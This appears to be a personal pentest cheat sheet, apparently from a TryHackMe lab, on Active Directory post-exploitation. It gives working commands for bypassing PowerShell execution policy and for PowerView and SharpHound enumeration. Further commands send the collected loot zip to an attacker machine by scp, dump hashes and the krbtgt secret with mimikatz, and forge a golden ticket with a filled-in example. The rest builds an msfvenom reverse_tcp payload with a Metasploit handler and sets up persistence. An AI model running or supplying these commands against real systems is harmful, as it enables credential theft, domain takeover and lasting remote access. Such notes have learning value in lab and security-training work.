# Post Exploitation

## Enumeration w/ Powerview

Bypasses the execution policy of PowerShell allowing you to easily run scripts:

```powershell
powershell -ep bypass
```

Import PowerView.ps1;

Enumerate Domain Users:

```powershell
Get-NetUser | select cn
```

Enumerate Domain Groups:

```powershell
Get-NetGroup -GroupName *admin*
```



Here's a cheatsheet with a lot of PowerView related commands:

[https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)



Find Shares:

```powershell
Invoke-ShareFinder
```

Get AD Computers' Information:

```powershell
Get-NetComputer -FullData
```

```powershell
Get-NetComputer -FullData | select operatingsystem, operatingsystemversion
```

## Enumeration w/ BloodHound

### Getting loot w/ SharpHound

Bypass Execution Policy

```powershell
powershell -ep bypass
```

Import SharpHound;

{% hint style="info" %}
Make sure the SharpHound.ps1 version is new, otherwise there will be problems with BloodHound
{% endhint %}

Getting Loot:

```powershell
Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
```

Send the loot to your Attacker machine (With SCP):

```powershell
scp C:\Users\Administrator\20241116222926_loot.zip kali@10.11.101.30:/home/kali/thm/postexploit
```

### Mapping the Network w/ BloodHound

Start neo4j:

```bash
sudo neo4j console
```

For first-time usage, you will set a password. After that run bloodhound.

```bash
bloodhound
```

Next, drag and drop the loot.zip file to bloodhound UI.

## Dumping hashes w/ mimikatz

Run mimikatz

```powershell
mimikatz.exe
```

Check privilege:

```powershell
privilege::debug
```

Dump hashes:

```
lsadump::lsa /patch
```

Then crack the hashes with hashcat

## Golden Ticket Attacks w/ mimikatz

Check privilege:

```powershell
privilege::debug
```

Dumps the hash and security identifier of the Kerberos Ticket Granting Ticket account allowing you to create a golden ticket:

```powershell
lsadump::lsa /inject /name:krbtgt
```

You need these outlined in red to create a golden ticket:

<figure><img src="../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

### Create a Golden Ticket

Create ticket:

```
kerberos::golden /user: /domain: /sid: /krbtgt: /id:
```

Example:

```
kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt
:5508500012cc005cf7082a9a89ebdfdf /id:500
```

### Use Golden Ticket to access all other machines

```
misc::cmd
```

## Maintaining Access

Generating a payload w/ msfvenom:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe
```

Transfer the payload from your (attacker) machine to the target machine

Listen using use exploit/multi/handler in metasploit

Set payload:

```bash
set payload windows/meterpreter/reverse_tcp
```

Run the listener and execute the payload on target

### Persistence Module

First, background the meterpreter shell:

```bash
background
```

Use Local Persistence module for Windows:

```bash
use exploit/windows/local/persistence
```

Next, set session to the one you need:

```bash
set session 1
```

